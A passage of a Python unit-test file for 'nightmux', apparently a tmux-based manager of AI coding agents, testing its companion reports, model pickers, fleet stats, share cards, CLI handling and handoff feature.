                assert companion_focus(cff, lk_, "9", "focus") == "📌 5: ship checkout v2"
                assert companion_focus(cff, lk_, "5", "focus") == "📌 ship checkout v2"
                with stubbed(topics_status=lambda c, s: rows_[:3], _chat={}, tmux_git=lambda *a: ""):
                    rep5 = progress_report(cff, {}, now_ - 60)
                assert rep5.startswith("▸ shop (topic 5)") and "📌 target: ship checkout v2 — idle" in rep5 \
                    and "blog" not in rep5 and "quiet" not in rep5, rep5
                companion_focus(cff, lk_, "5", "focus off")
                assert cff["companion"]["focus"] == {}
                companion_focus(cff, lk_, "5", "focus a")
                companion_focus(cff, lk_, "9", "focus off")
                assert "focus" not in cff["companion"]
                # never in a project's own topic: it would unbind the project
                assert "runs 'shop'" in companion_cmd(cff, {}, lk_, "5", "")
                # night rounds leave the day watch alone
                stw_ = {"companion": {"sched": [{"at": 1, "every": 60, "text": "w",
                                                 "companion": True, "watch": True}]}}
                companion_night(dict(cff, tz_offset=0), stw_, "night 01:00 07:30")
                companion_night(dict(cff, tz_offset=0), stw_, "night off")
                assert [j["text"] for j in stw_["companion"]["sched"]] == ["w"]
            # Gated rounds: the report rides in the prompt; nothing new, no model call;
            # a big thread is cleared first unless the owner spoke within the hour.
            with stubbed(topics_status=lambda c, s: rows_[0:1], _chat=chat_, tmux_git=lambda *a: "",
                         agent_key=lambda c, t, s: "claude"):
                stw = {"comp": {"ctx_tok": 200000, "sched": [
                    {"at": 0, "every": 3600, "text": "w", "watch": True, "companion": True,
                     "progress": True, "gate": True, "since": now_ - 60}]}}
                sent_ = []
                with stubbed(send=lambda *a, **k: sent_.append(a)):
                    due(cfgp, stw, "9", "comp")
                    q_ = stw["comp"]["queue"]
                    # a saved round runs today's prompt, not the "w" it was saved with
                    assert q_[0] == "/clear" and q_[1].startswith(COMPANION_WATCH + "\n\nProgress since "), q_
                    assert "▸ shop (topic 5)" in q_[1] and not sent_        # no ⏰ ping
                    stw["comp"]["queue"], stw["comp"]["sched"][0]["at"] = [], 0
                    due(cfgp, stw, "9", "comp")                 # nothing new since
                    assert not stw["comp"]["queue"] and stw["comp"]["sched"][0]["at"] > now_
                    chat_["5"].append({"id": 9, "t": time.time() + 1, "who": "bot", "text": "✅ shop\nadded tests"})
                    chat_["9"] = [{"id": 10, "t": time.time(), "who": "you", "text": "hi"}]
                    stw["comp"]["sched"][0]["at"] = 0
                    due(cfgp, stw, "9", "comp")
                    q_ = stw["comp"]["queue"]
                    assert len(q_) == 1 and "added tests" in q_[0], q_   # owner just spoke: no /clear
            # suggest: a ledger on disk, so ▶ works after a restart and taps teach it;
            # 3 waiting per topic, 6 an hour, a dropped idea never comes back.
            sent_ = []
            with stubbed(send=lambda c, t, x, **k: sent_.append((t, x, k.get("buttons")))):
                del _idea_times[:]
                cfgs = {"topics": {"5": "shop", "6": "blog"}}
                p1 = "[role: tester] b\n\nTask: add a test for cart totals"
                assert "posted" in suggest_post(cfgs, "5", p1)
                t_, x_, btn = sent_[-1]
                assert t_ == "5" and x_.endswith("add a test for cart totals") and "!suggest run" in btn
                sid1 = re.search(r"!suggest run (\w+)", btn).group(1)
                assert "no project" in suggest_post(cfgs, "7", "x")
                suggest_post(cfgs, "5", "idea 0")
                sid2 = re.search(r"!suggest drop (\w+)", sent_[-1][2]).group(1)
                suggest_post(cfgs, "5", "idea 1")
                assert "3 ideas already wait" in suggest_post(cfgs, "5", "idea 2")
                got_p = []
                with stubbed(send_prompt=lambda c, s, t, se, p, mid=None: got_p.append((t, p)) or "sent"):
                    handle(dict(cfgs), {}, threading.Lock(), "5", f"!suggest run {sid1}")
                    assert got_p == [("5", p1)]
                    assert "already taken" in handle(dict(cfgs), {}, threading.Lock(), "5", f"!suggest run {sid1}")
                    assert "dropped" in handle(dict(cfgs), {}, threading.Lock(), "5", f"!suggest drop {sid2}")
                    assert "already taken" in handle(dict(cfgs), {}, threading.Lock(), "6", f"!suggest run {sid2}")
                assert "dropped this exact idea" in suggest_post(cfgs, "5", "idea 0")
                stats_ = idea_stats()
                assert "▶ 1 sent · ✕ 1 dropped · 0 ignored · 1 waiting" in stats_ and "idea 0" in stats_, stats_
                assert "1 ignored" in idea_stats(time.time() + IDEA_STALE + 60)
                for i in range(3):
                    suggest_post(cfgs, "6", f"blog idea {i}")
                assert "6 ideas" in suggest_post(cfgs, "6", "one more")
            # the signals an expert scans for: goal state, errors, uncommitted work, the plan
            os.makedirs(os.path.join(cd_, ".nightmux"), exist_ok=True)
            with open(os.path.join(cd_, ".nightmux", "memory.md"), "w") as f:
                f.write("# x\n## Decisions\n- a\n## In progress / next\n- ship checkout\n- add coupons\n")
            with stubbed(topics_status=lambda c, s: rows_[0:1], _err_log=[(time.time(), "5", "KeyError: cart")],
                         _chat={"5": [{"id": 1, "t": time.time(), "who": "bot", "text": "🛑 goal stuck — x"}]},
                         tmux_git=lambda cwd, *a: " 2 files changed, 10 insertions(+)" if a[0] == "diff" else "true" if a[0] == "rev-parse" else ""):
                rep4 = progress_report({"dirs": {"5": cd_}}, {}, time.time() - 60)
                for want in ("🎯 🛑 goal stuck", "🚨 1 production error: KeyError: cart",
                             "uncommitted: 2 files changed", "next: ship checkout", "next: add coupons",
                             "ideas, 7 days:"):
                    assert want in rep4, (want, rep4)
            assert {"progress", "suggest"} <= {t["name"] for t in NM_TOOLS}
            companion_log({"topic": "5", "role": "tester"}, "[role: tester] brief\n\nTask: add tests\nmore")
            with open(os.path.join(cd_, "actions.log")) as f:
                assert f.read().endswith("topic=5 role=tester add tests\n")
            out = companion_prompt(cfg_, "5", "fix it", "reviewer")
            assert out.startswith("[role: reviewer] You are the reviewer") and out.endswith("Task: fix it")
            for bad in ("../PERSONA", "nope"):
                try:
                    companion_prompt(cfg_, "5", "x", bad)
                    assert False, bad
                except ValueError:
                    pass
    # Fleet stats: Wrapped, coach and !stats sum every server's numbers; ratios are
    # recomputed from the sums, and a peer that does not answer is left out.
    a1_ = {"days": 30, "took": 1, "tips": [{"agent": "claude", "tip": "t1"}],
           "when": {"projects": [["shop", 3]], "at": {"10": 2}},
           "agents": {"claude": {"sessions": 1, "prompts": 10, "requests": 4, "errors": 0, "big_ctx": 0,
                                 "max_ctx": 50, "tokens": {"input": 10, "cache_read": 90, "cache_write": 0,
                                                           "output": 5, "thinking": 0},
                                 "avg_prompt": 100, "nudge_pct": 0.1, "nudges": [["ok", 1]],
                                 "models": {"opus": 4}, "daily": {"2026-10-12": [400, 4]},
                                 "by_model": {"opus": [1, 2, 3, 4]}}}}
    a2_ = json.loads(json.dumps(a1_))
    a2_["agents"]["claude"].update(prompts=30, avg_prompt=200, nudge_pct=0.5, max_ctx=80,
                                   tokens={"input": 90, "cache_read": 10, "cache_write": 0,
                                           "output": 5, "thinking": 0},
                                   by_model={"opus": [10, 20, 30, 40], "other": [1, 1, 1, 1]})
    a2_["when"] = {"projects": [["shop", 1], ["blog", 2]], "at": {"10": 1, "11": 4}}
    got_ = {"api/analysis?days=30": a2_, "api/savings": {"since": 50, "tokens": 7, "tokens_day": {"2026-10-01": 7}},
            "api/lessons": {"n": 4, "ok": 2, "winners": ["w2"]}}
    fcfg_ = {"peers": {"vps2": {"url": "u"}, "vps3": {"url": "v"}}}
    with stubbed(peer_call=lambda c, n, p, b=None, timeout=10: got_.get(p) if n == "vps2" else None,
                 host_name=lambda c: "vps1", analyze_chats=lambda d=30, home=None: a1_,
                 sav_data=lambda: {"since": 100, "tokens": 3, "tokens_day": {"2026-10-01": 1, "2026-09-30": 2}, "spent": {}},
                 prompt_lessons=lambda home=None: {"n": 6, "ok": 5, "winners": ["w1"]}, _analysis={}):
        m_ = fleet_analysis(fcfg_, 30)
        c_ = m_["agents"]["claude"]
        assert m_["servers"] == ["vps1", "vps2"] and c_["prompts"] == 40 and c_["max_ctx"] == 80
        assert c_["daily"] == {"2026-10-12": [800, 8]}, c_["daily"]
        assert c_["by_model"] == {"opus": [11, 22, 33, 44], "other": [1, 1, 1, 1]}, c_["by_model"]
        assert c_["cache_hit"] == 0.5 and c_["avg_prompt"] == 175 and c_["nudge_pct"] == 0.4, c_
        assert m_["when"] == {"projects": [("shop", 4), ("blog", 2)], "at": {"10": 3, "11": 4}}, m_["when"]
        assert len(m_["tips"]) == 2 and "vps2" in stats_report(m_).splitlines()[0]
        s_ = fleet_sav(fcfg_)
        assert s_["since"] == 50 and s_["tokens"] == 10 and s_["tokens_day"] == {"2026-10-01": 8, "2026-09-30": 2}
        assert fleet_lessons(fcfg_) == {"n": 10, "ok": 7, "winners": ["w1", "w2"]}
        assert fleet_analysis({}, 30) is a1_            # no peers: no merge, no second cache
        # !coach once crashed on an undefined name before drawing anything
        with stubbed(threading=type("T", (), {"Thread": lambda *a, **k: type("X", (), {"start": lambda s: None})()})):
            assert coach_cmd(fcfg_, "1").startswith("🎯 drawing")
    # A prompt that keeps calling the model: said once, with an esc button.
    sent_c = []
    with stubbed(send=lambda c, t, x, **k: sent_c.append(x), agent_key=lambda c, t, s: "agy"):
        stc = {"calls": CALLS_WARN, "ctx_tok": 150000}
        warn_ctx({}, stc, "1", "s")
        warn_ctx({}, stc, "1", "s")
        assert len(sent_c) == 1 and f"{CALLS_WARN} model calls" in sent_c[0] and "150k" in sent_c[0], sent_c
    # agy: the context of its newest conversation in this folder, 0 after its CHECKPOINT
    import sqlite3
    with tempfile.TemporaryDirectory() as ah_:
        root_ = os.path.join(ah_, ".gemini", "antigravity-cli")
        os.makedirs(os.path.join(root_, "brain", "c2", ".system_generated", "logs"))
        con_ = sqlite3.connect(os.path.join(root_, "conversation_summaries.db"))
        con_.execute("CREATE TABLE conversation_summaries (conversation_id text, workspace_uris text, "
                     "nesting_depth integer, last_modified_time datetime)")
        con_.executemany("INSERT INTO conversation_summaries VALUES (?,?,?,?)",
                         [("c1", '["file:///w/app"]', 0, "2026-10-01"), ("c2", '["file:///w/app"]', 0, "2026-10-02"),
                          ("c3", '["file:///w/app2"]', 0, "2026-10-03"), ("c4", '["file:///w/app"]', 1, "2026-10-04")])
        con_.commit()
        con_.close()
        tf_ = os.path.join(root_, "brain", "c2", ".system_generated", "logs", "transcript.jsonl")
        with open(tf_, "w") as f:
            f.write(json.dumps({"type": "PLANNER_RESPONSE", "input_tokens": 3000, "cache_read_tokens": 140000}) + "\n")
        assert agy_ctx("/w/app", home=ah_) == 143000 and agy_ctx("/w/none", home=ah_) is None
        with open(tf_, "a") as f:
            f.write(json.dumps({"type": "CHECKPOINT"}) + "\n")
        assert agy_ctx("/w/app/", home=ah_) == 0
    screens_ = [["Search: Continue", "  esc Go back / Clear search"], ["  esc Go back / Clear search"], [">"]]
    keys_ = []
    with stubbed(visible=lambda s_: screens_.pop(0) if len(screens_) > 1 else screens_[0],
                 tmux=lambda *a: keys_.append(a)):
        close_picker("x")
    assert [a[-1] for a in keys_] == ["Escape", "Escape"], keys_   # two, never a third
    # opencode's lists (captured from v2.0.24): the session switcher a prompt
    # was typed into, and the model list over the chat it is drawn on.
    ocs_ = ["      Sessions for proj                                   esc",
            "      rsonal data. Reply with one line: memory updated.Update",
            "      No sessions found",
            "      delete ctrl+d  rename ctrl+r            all projects ctrl+a",
            "   ┃  Build · GLM-5.3-Flash Free OpenCode · high",
            "   ╹▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀"]
    screens_, keys_ = [ocs_, ocs_[4:]], []
    with stubbed(visible=lambda s_: screens_.pop(0) if len(screens_) > 1 else screens_[0],
                 tmux=lambda *a: keys_.append(a)):
        close_picker("x")
    assert [a[-1] for a in keys_] == ["Escape"], keys_
    assert not any(OC_DIALOG.match(l) for l in ["  ┃  ↑↓ select  enter submit  esc dismiss",
                                               "  ⬝⬝⬝ working   esc interrupt"])
    ocm_ = ["                    Select model                                     esc",
            "                    glm 5.2",
            "                    GLM-5.2                                         Z.AI",
            "         ┃          GLM-5.2                                  OpenCode Go",
            "         ╹▀▀▀▀▀▀    Iceman Contributor Free                         Free    ▀▀▀",
            "                    Connect an integration ctrl+a  Favorite ctrl+f"]
    assert oc_rows(ocm_) == ("Select model", ["GLM-5.2 · Z.AI", "GLM-5.2 · OpenCode Go",
                                              "Iceman Contributor Free · Free"]), oc_rows(ocm_)
    assert oc_rows(ocs_[4:]) is None
    keys_ = []                           # "glm-5.2 opencode go" is the second row
    with stubbed(visible=lambda s_: ocm_ + ["   ┃  Build · GLM-5.2 OpenCode Go"], settle=lambda *a: True,
                 close_picker=lambda s_: None, tmux=lambda *a: keys_.append(a[3:]), tgt=lambda s_: s_):
        assert oc_model("x", "glm-5.2 opencode go") == "🧠 opencode model: GLM-5.2 OpenCode Go"
    assert ("Down",) in keys_ and keys_.index(("Down",)) < keys_.index(("Enter",), 2), keys_
    # The /model pickers, captured: Claude Code (numbered, ❯), codex (›), agy (bare >).
    cl_ = ["  Select model", "  Switch between Claude models. Your pick becomes the default",
           "  specify with --model.",
           "    1.  Default (recommended)  Opus 5.5 · Best for everyday",
           "  ❯ 2.  Opus 5.5 ✔             For complex work",
           "    3.  Sonnet 5.5             Most efficient",
           "  ↓ 4.  Opus 4.8               Best for everyday", "     … +3 models",
           "  ◐ Medium effort (default) ←/→ to adjust",
           "  Enter to set as default · s to use this session only · Esc to cancel"]
    assert model_rows(cl_) == (["Default", "Opus 5.5", "Sonnet 5.5", "Opus 4.8"], 1), model_rows(cl_)
    cx_ = ["  /model - choose what model and reasoning effort to use", "  Select Model and Effort",
           "› 1. GPT-6-Luna (default)  Fast and affordable model.",
           "  2. GPT-5.6-Terra         Older balanced model.", "  enter select · esc back"]
    assert model_rows(cx_) == (["GPT-6-Luna", "GPT-5.6-Terra"], 0), model_rows(cx_)
    ag_ = ["> /model", "Switch Model", "  Search:", "          ────────────", "  Gemini 4 Argon",
           "> Gemini 3.8 Flash      (current)", "  Claude Opus 5.5",
           "  Effort  ◂        ●━━━━━━━●━━━━━◉", "Keyboard: ↑/↓ Navigate  enter Select  esc Go Back"]
    assert model_rows(ag_) == (["Gemini 4 Argon", "Gemini 3.8 Flash", "Claude Opus 5.5"], 1), model_rows(ag_)
    assert model_rows(["❯ ", "  Select model and go"]) is None
    keys_, scr_ = [], [cl_]       # tap "Sonnet 5.5": one Down, then this-session-only
    def ft_(*a):
        keys_.append(a[3:])
        if a[3:] == ("Down",):
            scr_[0] = [l.replace("  ❯ 2.", "    2.").replace("    3.  Sonnet", "  ❯ 3.  Sonnet") for l in cl_]
        if a[3:] == ("s",):
            scr_[0] = ["❯ "]
    with stubbed(visible=lambda s_: scr_[0], tmux=ft_, tgt=lambda s_: s_, close_picker=lambda s_: None):
        assert model_cmd("x", "sonnet 5.5") == "🧠 x: Sonnet 5.5"
    assert keys_[-2:] == [("Down",), ("s",)], keys_
    # agy model tests
    agy_keys = []
    def agy_ft_(*a):
        agy_keys.append(a)
    with stubbed(visible=lambda s_: ["Antigravity CLI"], pane_state=lambda s_: "idle",
                 tmux=agy_ft_, tgt=lambda s_: s_, close_picker=lambda s_: None):
        assert isinstance(model_cmd("t-agy", ""), list)
        assert model_cmd("t-agy", "flash") == "🧠 t-agy: Gemini 3.8 Flash (High)"
        assert model_cmd("t-agy", "argon") == "🧠 t-agy: Gemini 4 Argon (High)"
    assert any("/model gemini-3.8-flash-high" in " ".join(k) for k in agy_keys)
    assert any("/model gemini-4-argon-high" in " ".join(k) for k in agy_keys)
    # close_picker dismissing Switch Model and banner
    esc_keys = []
    def esc_ft_(*a):
        if "Escape" in a:
            esc_keys.append("Escape")
    with stubbed(visible=lambda s_: ["Switch Model", "esc Go Back"], tgt=lambda s_: s_, tmux=esc_ft_):
        close_picker("t-agy")
    assert "Escape" in esc_keys
    # Arabic keyboard layout translation
    assert "ظةخيثم".translate(AR_EN_MAP) == "/model"
    assert "!ةخيثم".translate(AR_EN_MAP) == "!model"
    # Park compact: idle past park_compact, 110k compacts; not idle long enough, it doesn't.
    typed = []
    with stubbed(send=lambda *a, **k: None, inject=lambda s_, t: typed.append(t),
                 remember=lambda *a: None, agent_key=lambda *a: "claude"):
        pc = {"autocompact": "200k", "park_compact": 20}
        autocompact(pc, {"s": {"mode": "idle", "ctx_tok": 110000,
                               "changed": time.time() - 30 * 60}}, "1", "s")
        autocompact(pc, {"s": {"mode": "idle", "ctx_tok": 110000,
                               "changed": time.time() - 5 * 60}}, "1", "s")
        autocompact({"autocompact": "200k"}, {"s": {"mode": "idle", "ctx_tok": 110000,
                     "changed": time.time() - 30 * 60}}, "1", "s")      # default 45m: not yet
        autocompact({"autocompact": "200k"}, {"s": {"mode": "idle", "ctx_tok": 110000,
                     "changed": time.time() - 50 * 60}}, "1", "s")      # default 45m: now
        autocompact({"autocompact": "200k", "park_compact": None}, {"s": {"mode": "idle",
                     "ctx_tok": 110000, "changed": time.time() - 50 * 60}}, "1", "s")  # off
    assert typed == ["/compact", "/compact"], typed
    with stubbed(save_cfg=lambda c: None, has_session=lambda n: True):
        ac_ = handle({"topics": {"1": "s"}, "autocompact": "200k"}, {}, threading.Lock(), "1", "!autocompact")
    assert "200,000 tokens" in ac_ and "idle 45m" in ac_, ac_
    # A non-snapshot json in the state dir must not stop prune (and the watcher).
    with tempfile.TemporaryDirectory() as td_:
        with open(os.path.join(td_, "paired_tokens.json"), "w") as f_:
            json.dump(["x"], f_)
        with stubbed(STATE_DIR=td_):
            assert snap_pane(os.path.join(td_, "paired_tokens.json")) is None
            prune(time.time(), 0.0, {"%1"})
    # Companion revamp: priorities from PERSONA.md, an allowance for unbudgeted
    # projects, projects with no session, and talking to it through !companion.
    cdir_, pdir_ = tempfile.mkdtemp(), tempfile.mkdtemp()
    os.makedirs(os.path.join(pdir_, ".nightmux"))
    with open(os.path.join(pdir_, ".nightmux", "memory.md"), "w") as f:
        f.write("# x\n## In progress / next\n- ask the owner for sample SMS\n")
    with open(os.path.join(cdir_, "PERSONA.md"), "w") as f:
        f.write("# P\n## Priorities\n1. nightmux (x) — a\n2. Pennywise — b\n3. (project)\n## Tone\n")
    ccf_ = {"topics": {"0": "companion", "7": "work"}, "topic_names": {"9": "Pennywise"},
            "dirs": {"7": "/srv/nightmux", "9": pdir_}, "companion": {"topic": "0", "session": "companion"}}
    with stubbed(COMPANION_DIR=cdir_, sav_path=lambda: os.path.join(cdir_, "sav.json")):
        assert persona_priorities(ccf_) == ["7", "9"], persona_priorities(ccf_)
        try:
            companion_prompt(ccf_, "9", "go")
            raise AssertionError("no budget and no allowance must refuse")
        except ValueError as e:
            assert "no allowance" in str(e), e
        ccf_["budgets"] = {"0": {"tokens": 1000, "per": "day"}}
        assert companion_prompt(ccf_, "9", "go") == "go"          # the allowance covers it
        companion_log({"topic": "7"}, "go")
        hr_ = int(time.time() // 3600)
        with open(os.path.join(cdir_, "sav.json"), "w") as f:
            json.dump({"spent": {"work": {str(hr_): 1500}}}, f)
        assert companion_allowance(ccf_)[:2] == (1500, 1000)
        try:
            companion_prompt(ccf_, "9", "go")
            raise AssertionError("a spent allowance must refuse")
        except ValueError as e:
            assert "allowance is spent" in str(e), e
        with stubbed(topics_status=lambda c, st: [], tmux_git=lambda *a: ""):
            rep_ = progress_report(ccf_, {}, time.time() - 3600)
        assert "Pennywise (topic 9) [no session]" in rep_ and "⭐ priority 2" in rep_, rep_
        assert "next: ask the owner for sample SMS" in rep_, rep_
        cst_ = {}
        with stubbed(has_session=lambda n: True, save_queue=lambda st: None):
            assert "passed" in companion_cmd(ccf_, cst_, threading.Lock(), "0", "work on pennywise")
        assert cst_["companion"]["queue"] == ["work on pennywise"], cst_
        with stubbed(save_queue=lambda st: None):
            companion_watch(ccf_, cst_, "watch 3h")
        job_ = cst_["companion"]["sched"][-1]
        assert job_["at"] - time.time() < 120 and time.time() - job_["since"] > 3 * 3600 - 60, job_
    shutil.rmtree(cdir_, ignore_errors=True)
    shutil.rmtree(pdir_, ignore_errors=True)
    # A priority on a peer is never woken here, where its folder is empty.
    try:
        companion_wake("http://127.0.0.1:1", {"dirs": {"9": "/tmp"}, "remote": {"9": "vps2"}}, "9")
        raise AssertionError("woke a remote topic locally")
    except ValueError as e_:
        assert "vps2" in str(e_), e_

    # !teleport, !harvest, !vibe, and OpenGraph Share Studio (/share, /share/card.svg)
    with tempfile.TemporaryDirectory() as tdir:
        os.makedirs(os.path.join(tdir, ".git"), exist_ok=True)
        tcfg = {"topics": {"11": "tp"}, "started": {"11": "claude"}, "dirs": {"11": tdir},
                "agents": {"claude": ["/bin/sh", ""], "codex": ["/bin/sh", ""]}}
        tstate = {"tp": {"last": "refactor auth middleware", "mode": "idle",
                         "changed": time.time() - 300,
                         "snap": {"ts": time.time(),
                                  "five_hour": {"used_percentage": 52,
                                                "resets_at": time.time() + 1800}}}}
        tlk = threading.Lock()
        tsent = []
        with stubbed(switch_agent=lambda c, s, l, t, k: (c["topics"].__setitem__(t, "tp-" + k)
                                                         or c["started"].__setitem__(t, k)
                                                         or f"→ {k}"),
                     has_session=lambda s: True, pane=lambda s: ["✓ tests pass"],
                     save_queue=lambda s: None, save_cfg=lambda c: None,
                     sav_add=lambda k, n=1: None,
                     send=lambda c, t, x, mode="mono", buttons=None, quiet=False: tsent.append((x, buttons))):
            hpath, hbody = teleport_packet(tcfg, tstate, "11", "tp")
            assert hpath and os.path.isfile(hpath) and "refactor auth middleware" in hbody, hbody
            out_tp = teleport_cmd(tcfg, tstate, tlk, "11", "tp", "codex finish edge cases")
            assert "context teleported from claude → codex" in out_tp, out_tp
            assert "finish edge cases" in tstate["tp-codex"]["queue"][0], tstate["tp-codex"]
            # !harvest add, status, and harvest_tick
            h_add = harvest_cmd(tcfg, tstate, tlk, "11", "tp-codex", "add write missing auth tests")
            assert "queued harvest task #1" in h_add, h_add
            h_cap = harvest_cmd(tcfg, tstate, tlk, "11", "tp-codex", "ceiling 80")
            assert "80%" in h_cap, h_cap
            tstate["tp-codex"] = {"mode": "idle", "changed": time.time() - 300, "queue": []}
            harvest_tick(tcfg, tstate, tlk)
            assert tstate["tp-codex"]["queue"] == ["write missing auth tests"], tstate["tp-codex"]
            assert any("quota harvest" in m for m, _ in tsent), tsent
            vibe_cmd(tcfg, tstate, "11", "tp-codex")
            assert any("vibe cockpit" in m for m, _ in tsent), tsent
        svg_ = share_card_svg(tcfg, {"tokens": ["14.2M"], "saved": ["41%"], "prompts": ["128"]})
        assert "<svg" in svg_ and "14.2M" in svg_ and "41%" in svg_, svg_[:200]
        with stubbed(wrapped_data=lambda c, d: {"cells": [("14.2M", "TOKENS CRUNCHED")],
                                                "agents": ["claude"], "projects": [("a", 1)],
                                                "split": [], "hours": [0] * 24, "insights": []}):
            sp_ = share_page_html(tcfg, {"days": ["30"]}, "https://demo.example.com")
            assert 'property="og:image"' in sp_ and 'name="twitter:card"' in sp_, sp_[:400]
            assert "navigator.canShare" in sp_ and "demo.example.com/share/card.svg" in sp_, sp_[:600]
        assert "AT API LIST PRICES" not in svg_ and "$677" in share_card_svg(tcfg, {"tokens": ["1M"], "usd": ["$677"]})
        # the card's query follows the labels, not the order: the dollar cell sits second
        with stubbed(wrapped_data=lambda c, d: {"cells": [("14.2M", "TOKENS CRUNCHED"), ("$677", "AT API LIST PRICES"),
                                                          ("41%", "SAVED FROM THE ABYSS (5.0M)"),
                                                          ("2.0M", "SAVED VIA SMART ROUTING"),
                                                          ("128", "VIBE DIRECTIVES ISSUED")],
                                                "agents": ["claude"], "projects": [("a", 1)],
                                                "split": [], "hours": [0] * 24, "insights": []}):
            cq_ = urllib.parse.parse_qs(html.unescape(re.search(
                r'/share/card\.svg\?([^"]+)"', share_page_html(tcfg, {"days": ["30"]}, "https://d.example.com")).group(1)))
            assert [cq_[k] for k in ("tokens", "usd", "saved", "lighter", "prompts")] == [
                ["14.2M"], ["$677"], ["41%"], ["2.0M"], ["128"]], cq_
        assert "url=https%3A%2F%2Fd.uguu.se%2Fx.png" in reddit_url("my recap", "https://d.uguu.se/x.png")
    # The CLI: -h prints usage, and an unknown option stops. `nightmux --help`
    # used to fall through to main() and start a daemon on the live config.
    import io
    ran_ = []

    def cli_(*args):
        old_argv_, sys.argv = sys.argv, ["nightmux", *args]
        out_, err_, code_ = io.StringIO(), io.StringIO(), None
        try:
            with contextlib.redirect_stdout(out_), contextlib.redirect_stderr(err_):
                cli()
        except SystemExit as e:
            code_ = e.code
        finally:
            sys.argv = old_argv_
        return code_, out_.getvalue(), err_.getvalue()

    with stubbed(main=lambda: ran_.append("daemon")):
        for args_ in (("--help",), ("-h",), ("--help", "--bogus")):
            code_, out_, err_ = cli_(*args_)
            assert code_ is None and "usage: nightmux" in out_ and "--doctor" in out_ and not ran_, (args_, out_, ran_)
        for args_ in (("--bogus",), ("setup",)):
            code_, out_, err_ = cli_(*args_)
            assert code_ == 2 and "unknown option" in err_ and "usage: nightmux" in err_ and not out_ and not ran_, (args_, code_, err_, ran_)
        # `wrapped` reads transcripts and nothing else: no daemon, nothing sent
        for args_ in (("wrapped", "0"), ("wrapped", "366"), ("wrapped", "x"), ("wrapped", "²"), ("wrapped", "7", "8")):
            code_, out_, err_ = cli_(*args_)
            assert code_ == 2 and "usage: nightmux wrapped" in err_ and not out_ and not ran_, (args_, code_, err_)
        with stubbed(analyze_chats=lambda d: {"agents": {}, "when": {}}, sav_data=lambda: {"tokens": 0, "model_tokens": 0}):
            code_, out_, err_ = cli_("wrapped", "3")
            assert isinstance(code_, str) and code_.startswith("no agent transcripts") and not ran_, code_
        with tempfile.TemporaryDirectory() as wo_, stubbed(
                analyze_chats=lambda d: r2_, sav_data=lambda: {"tokens": 0, "model_tokens": 0},
                browser_bin=lambda cfg: None):
            so_, se_ = io.StringIO(), io.StringIO()
            with contextlib.redirect_stdout(so_), contextlib.redirect_stderr(se_):
                wrapped_cli(["7"], out=os.path.join(wo_, "cards"))
            priv_, pub_ = (open(os.path.join(wo_, "cards", f"nightmux-wrapped{s}.html"), encoding="utf-8").read()
                           for s in ("", "-share"))
            assert "shop" in priv_ and "shop" not in pub_ and "project 1" in pub_, (priv_, pub_)
            assert "SECRETPROMPT" not in so_.getvalue() + priv_ + pub_
            assert "$8.40 at API list prices" in so_.getvalue() and "last 7 days" in so_.getvalue(), so_.getvalue()
            assert "not counted: " in so_.getvalue() and "gpt-x" in so_.getvalue(), so_.getvalue()
            assert "Nothing was uploaded" in so_.getvalue() and "last 7 days" in se_.getvalue(), (so_.getvalue(), se_.getvalue())
        # `handoff`: the newest conversation in a folder, a brief, another agent started on it
        with tempfile.TemporaryDirectory() as hh_:
            def w_(rel, rows, age):
                p_ = os.path.join(hh_, rel)
                os.makedirs(os.path.dirname(p_), exist_ok=True)
                with open(p_, "w", encoding="utf-8") as f_:
                    f_.writelines(json.dumps(r_, separators=(",", ":")) + "\n" for r_ in rows)
                os.utime(p_, (time.time() - age,) * 2)
                return p_
            repo_ = os.path.join(os.path.realpath(hh_), "repo")   # git answers with the resolved path
            os.makedirs(os.path.join(repo_, "sub"))
            for g_ in (("init", "-q"), ("-c", "user.email=a@b", "-c", "user.name=a",
                                         "commit", "-q", "--allow-empty", "-m", "first commit")):
                subprocess.run(["git", "-C", repo_, *g_], check=True, capture_output=True)
            open(os.path.join(repo_, "up.py"), "w").close()
            u_ = lambda text, **kw: {"type": "user", "cwd": repo_, "message": {"role": "user", "content": text}, **kw}
            cl_ = w_(".claude/projects/-r/a.jsonl", [
                u_("older ask"),
                {"type": "assistant", "message": {"content": [
                    {"type": "text", "text": "I will add a retry loop around the upload call."},
                    {"type": "tool_use", "name": "Edit", "input": {"file_path": "up.py"}}]}},
                u_("add retry to the uploader"),
                {"type": "user", "message": {"content": [{"type": "tool_result", "tool_use_id": "t", "content": "ok"}]}},
                {"type": "user", "message": {"content": [{"type": "text", "text": "reminder text, not agent reasoning"}]}},
                u_("meta noise", isMeta=True), u_("<command-name>/clear</command-name>"), u_("/compact"),
                u_("/effort max"), u_("This session is being continued from a previous conversation", isCompactSummary=True)], 100)
            cx_ = w_(".codex/sessions/2026/10/22/rollout-1.jsonl", [
                {"type": "session_meta", "payload": {"cwd": os.path.join(repo_, "sub")}},
                {"type": "event_msg", "payload": {"type": "user_message", "message": "codex ask"}}], 200)
            w_(".claude/projects/-o/b.jsonl", [u_("elsewhere", cwd=os.path.join(hh_, "other"))], 10)
            w_(".claude/projects/-p/c.jsonl", [u_("a sibling folder with the same prefix", cwd=repo_ + "2")], 5)
            assert latest_chat(repo_, home=hh_) == ("claude", cl_, "add retry to the uploader")
            os.utime(cx_, (time.time() - 50,) * 2)     # newest in the repo, from its sub folder
            assert latest_chat(repo_, home=hh_) == ("codex", cx_, "codex ask")
            assert latest_chat(os.path.join(hh_, "nowhere"), home=hh_) == (None, None, "")
            os.utime(cx_, (time.time() - 200,) * 2)
            execs_, real_latest_ = [], latest_chat

            def hand_(*a_, where=repo_):
                old_cwd_ = os.getcwd()
                os.chdir(where)
                try:
                    with stubbed(load_cfg=lambda: {"agents": {"codex": ["/bin/sh", ""], "opencode": ["/bin/sh", ""],
                                                              "agy": ["/nonexistent/agy", ""]}},
                                 latest_chat=lambda root: real_latest_(root, home=hh_),
                                 _exec=execs_.append, setup=lambda: ran_.append("setup")):
                        return cli_("handoff", *a_)
                finally:
                    os.chdir(old_cwd_)
            code_, out_, err_ = hand_()
            hp_ = os.path.join(repo_, ".nightmux", "HANDOFF.md")
            assert code_ is None and not execs_ and not err_, (code_, err_)
            assert "reminder text" not in out_ and "/compact" not in out_ and "being continued" not in out_, out_
            for want_ in ("## Last Instruction\nadd retry to the uploader", "`Edit`", "retry loop", "?? up.py",
                          "## Recent Commits", "first commit", "saved to " + hp_, "codex"):
                assert want_ in out_, (want_, out_)
